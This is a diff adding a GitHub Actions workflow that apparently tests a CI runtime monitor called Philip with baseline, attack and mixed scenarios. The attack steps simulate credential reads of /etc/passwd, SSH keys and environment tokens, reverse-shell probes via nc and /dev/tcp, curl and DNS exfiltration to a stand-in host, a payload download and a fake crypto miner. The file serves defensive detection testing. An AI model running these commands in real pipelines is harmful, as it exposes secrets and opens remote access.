@@ -1,0 +1,127 @@
+name: Philip E2E Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      scenario:
+        description: "Test scenario to run"
+        required: true
+        type: choice
+        options:
+          - baseline
+          - attack
+          - mixed
+        default: baseline
+      iteration:
+        description: "Iteration number (for baseline training)"
+        required: false
+        default: "1"
+
+jobs:
+  build:
+    name: "E2E (${{ inputs.scenario }} #${{ inputs.iteration }})"
+    runs-on: [self-hosted, philip]
+    steps:
+      # --- Philip monitoring starts here ---
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
+      - uses: actions/checkout@v4
+
+      # =============================================================
+      # BASELINE — normal CI/CD behavior
+      # =============================================================
+      - name: "Install dependencies"
+        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
+        run: |
+          echo "Installing project dependencies..."
+          curl -sf https://registry.npmjs.org/express > /dev/null 2>&1 || true
+          sleep 1
+
+      - name: "Build"
+        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
+        run: |
+          echo "Building project..."
+          go vet ./... 2>/dev/null || true
+          ls -la
+          echo "Build complete"
+
+      - name: "Run tests"
+        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
+        run: |
+          echo "Running tests..."
+          go test ./backend/detection/... -count=1 -short 2>/dev/null || true
+          echo "Tests complete"
+
+      # =============================================================
+      # ATTACK — simulated supply chain attack
+      # =============================================================
+      - name: "Malicious: credential exfiltration"
+        if: inputs.scenario == 'attack'
+        run: |
+          echo "=== SIMULATED ATTACK: credential access ==="
+          cat /etc/passwd > /dev/null 2>&1 || true
+          ls -la /home/runner/.ssh/ 2>/dev/null || true
+          cat /proc/self/environ > /dev/null 2>&1 || true
+          env | grep -i token > /dev/null 2>&1 || true
+
+      - name: "Malicious: reverse shell attempt"
+        if: inputs.scenario == 'attack'
+        run: |
+          echo "=== SIMULATED ATTACK: reverse shell ==="
+          timeout 2 nc -z 198.51.100.1 4444 2>/dev/null || true
+          timeout 2 bash -c 'echo test > /dev/tcp/198.51.100.1/4444' 2>/dev/null || true
+
+      - name: "Malicious: data exfiltration"
+        if: inputs.scenario == 'attack'
+        run: |
+          echo "=== SIMULATED ATTACK: exfiltration ==="
+          timeout 2 curl -sf http://198.51.100.1:8888/exfil 2>/dev/null || true
+          timeout 2 nslookup "$(whoami).evil.example.com" 2>/dev/null || true
+          timeout 2 curl -sf http://198.51.100.1:4444/payload -o /tmp/payload 2>/dev/null || true
+
+      - name: "Malicious: crypto miner"
+        if: inputs.scenario == 'attack'
+        run: |
+          echo "=== SIMULATED ATTACK: crypto miner ==="
+          touch /tmp/xmrig && chmod +x /tmp/xmrig || true
+          timeout 2 /tmp/xmrig --donate-level=0 2>/dev/null || true
+          rm -f /tmp/xmrig
+
+      # =============================================================
+      # MIXED — mostly benign + one suspicious call
+      # =============================================================
+      - name: "Mixed: suspicious network call"
+        if: inputs.scenario == 'mixed'
+        run: |
+          echo "=== MIXED: suspicious action in a normal build ==="
+          timeout 2 curl -sf http://198.51.100.1:9999/unexpected 2>/dev/null || true
+
+      # =============================================================
+      # Report — this runs ON the runner, hitting localhost
+      # =============================================================
+      - name: "Philip results"
+        if: always()
+        run: |
+          echo ""
+          echo "========================================="
+          echo " Philip Report"
+          echo " Scenario:  ${{ inputs.scenario }}"
+          echo " Iteration: ${{ inputs.iteration }}"
+          echo "========================================="
+          echo ""
+          echo "--- Baseline ---"
+          curl -sf "http://localhost:8080/api/v1/baselines?repository=${{ github.repository }}" \
+            | jq '{status, total_jobs_observed, process_count: (.process_profiles | length), network_count: (.network_profiles | length)}' \
+            2>/dev/null || echo "(no baseline yet)"
+          echo ""
+          echo "--- Findings ---"
+          curl -sf "http://localhost:8080/api/v1/findings?repository=${{ github.repository }}" \
+            | jq '.[] | {severity, verdict, confidence, reasoning}' \
+            2>/dev/null || echo "(no findings)"
+          echo ""
+          echo "--- Agent health ---"
+          systemctl is-active philip-agent 2>/dev/null && echo "philip-agent: running" || echo "philip-agent: not running"
+          systemctl is-active tetragon 2>/dev/null && echo "tetragon: running" || echo "tetragon: not running"
